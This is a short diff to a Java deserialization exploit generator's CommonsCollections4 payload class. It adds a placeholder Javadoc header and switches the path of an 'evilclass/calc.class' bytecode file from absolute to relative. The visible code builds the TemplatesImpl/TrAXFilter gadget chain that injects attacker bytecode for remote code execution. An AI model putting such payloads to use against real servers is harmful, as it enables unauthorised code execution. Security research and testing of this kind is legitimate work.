@@ -1,5 +1,11 @@
 package org.hasret.webserigen.payloads;
-
+/**
+ * 类描述
+ *
+ * @author Double
+ * @version 1.0
+ * @since 2025/4/1
+ */
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
@@ -36,7 +42,7 @@ public class CommonsCollections4 {
         tfactory.setAccessible(true);
         tfactory.set(templates, new TransformerFactoryImpl());
 
-        byte[] code = Files.readAllBytes(Paths.get("D:/WebJavaSeriGen/webserigen/src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
+        byte[] code = Files.readAllBytes(Paths.get("src/main/java/org/hasret/webserigen/payloads/evilclass/calc.class"));
         byte[][] codes = {code};
         Field bytecodes = c.getDeclaredField("_bytecodes");
         bytecodes.setAccessible(true);
